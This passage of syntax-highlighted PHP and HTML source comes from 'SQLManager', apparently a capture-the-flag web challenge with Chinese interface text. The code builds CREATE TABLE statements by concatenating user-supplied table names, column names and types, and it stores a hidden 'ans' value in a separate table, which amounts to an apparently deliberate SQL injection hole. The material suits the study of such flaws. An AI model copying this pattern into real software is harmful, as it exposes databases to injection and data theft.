  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'table_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'columns'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'Parameters missing.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$tName</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'table_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$ccc</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'columns'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.db'</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:db/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'表不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'表不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token number">10</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"CREATE TABLE {$tName} ("</span><span class="token punctuation">;</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"example1 TEXT, example2 TEXT"</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$column</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token variable">$ccc</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$column</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> <span class="token number">32</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'列不合法'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">', '</span><span class="token punctuation">;</span>
    <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">"`$column` $type"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token variable">$sql</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">');'</span><span class="token punctuation">;</span>

  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'CREATE TABLE `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` (`'</span> <span class="token punctuation">.</span> columnName <span class="token punctuation">.</span> <span class="token string">'` TEXT);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO `'</span> <span class="token punctuation">.</span> tableName <span class="token punctuation">.</span> <span class="token string">'` VALUES ("'</span> <span class="token punctuation">.</span> ans <span class="token punctuation">.</span> <span class="token string">'");'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'remove'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$pdo</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT * FROM `{$tName}`;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span> <span class="token operator">===</span> <span class="token constant">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'?page=index'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">FETCH_NUM</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>style.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.4.1.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo<span class="token punctuation">=</span><span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>SQLManager<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>show.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span></span>SQLManager<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>信息 <span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token variable">$message</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">===</span> <span class="token string">'index'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'database'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$tName</span><span class="token punctuation">)</span> <span class="token delimiter">?></span> <span class="token punctuation">(</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>remove<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>删表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>modify<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($cName); $i++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$cName</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($result); $i++) { ?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token markup">&lt; count($result[$i]); $j++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?</span><span class="token operator">=</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token markup">&lt; count($cName); $i++) { ?></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>values[]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Insert values<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
<span class="token delimiter">&lt;?php</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token delimiter">?></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>建表<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>?page<span class="token punctuation">=</span>build<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>表名 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table_name<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table_name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>输入表名<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">></span></span></span>列数 <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>number<span class="token punctuation">"</span></span> <span class="token attr-name">min</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">max</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>10<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>num<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>next<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Next<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>table<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Name<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">></span></span></span>Type<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>example1<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span>example2<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span></span><span class="token constant">TEXT</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span></span>
          <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span></span>
        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Create table<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>
    $<span class="token punctuation">(</span><span class="token string">'#next'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
      let num <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>$<span class="token punctuation">(</span><span class="token string">'#num'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      let len <span class="token operator">=</span> $<span class="token punctuation">(</span><span class="token string">'#table_name'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span>

